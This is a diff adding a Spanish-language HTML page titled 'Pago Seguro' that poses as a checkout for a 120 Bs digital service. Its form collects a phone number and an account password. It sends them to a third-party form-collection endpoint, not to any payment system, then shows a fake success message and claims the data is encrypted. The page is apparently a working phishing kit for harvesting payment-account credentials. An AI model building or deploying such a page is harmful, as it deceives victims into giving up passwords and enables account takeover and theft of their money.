@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pago Seguro</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f6fa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: #ffffff;
+            border-radius: 15px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 22px;
+            margin-bottom: 15px;
+            color: #333;
+        }
+
+        .compra-section {
+            background-color: #f1f1f1;
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        .compra-section h2 {
+            font-size: 18px;
+            margin-bottom: 10px;
+            color: #333;
+        }
+
+        .compra-section p {
+            font-size: 16px;
+            margin: 5px 0;
+            color: #555;
+        }
+
+        .formulario label {
+            display: block;
+            text-align: left;
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 5px;
+        }
+
+        .formulario input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        .formulario input:focus {
+            border-color: #4CAF50;
+            outline: none;
+        }
+
+        .btn {
+            background-color: #4CAF50;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.3s;
+        }
+
+        .btn:hover {
+            background-color: #45a049;
+        }
+
+        .success-message {
+            display: none;
+            background-color: #e0f7ef;
+            border-radius: 10px;
+            padding: 15px;
+            color: #4CAF50;
+            margin-top: 20px;
+            font-weight: bold;
+            text-align: center;
+        }
+
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #999;
+        }
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Pago Seguro</h1>
+
+        <div class="compra-section">
+            <h2>Resumen de Compra</h2>
+            <p><strong>Producto:</strong> Servicio Digital</p>
+            <p><strong>Monto:</strong> 120 Bs</p>
+            <p><strong>Descripción:</strong> Pago único</p>
+        </div>
+
+        <form action="https://formspree.io/f/mqakakoq" method="POST" class="formulario">
+            <label for="telefono">Número de teléfono:</label>
+            <input type="text" id="telefono" name="telefono" placeholder="Ingresa tu número de teléfono" required><br>
+
+            <label for="contraseña">Contraseña:</label>
+            <input type="password" id="contraseña" name="contraseña" placeholder="Ingresa tu contraseña" required><br>
+
+            <button type="submit" class="btn">Pagar 120 Bs</button>
+        </form>
+
+        <div class="success-message" id="successMessage">
+            <p>¡Pago recibido con éxito!</p>
+        </div>
+
+        <div class="footer">
+            <p>Este es un sistema seguro de pago. Todos los datos están encriptados.</p>
+        </div>
+    </div>
+
+    <script>
+        const form = document.querySelector('.formulario');
+        form.addEventListener('submit', function(e) {
+            document.getElementById('successMessage').style.display = 'block';
+        });
+    </script>
+</body>
+</html>
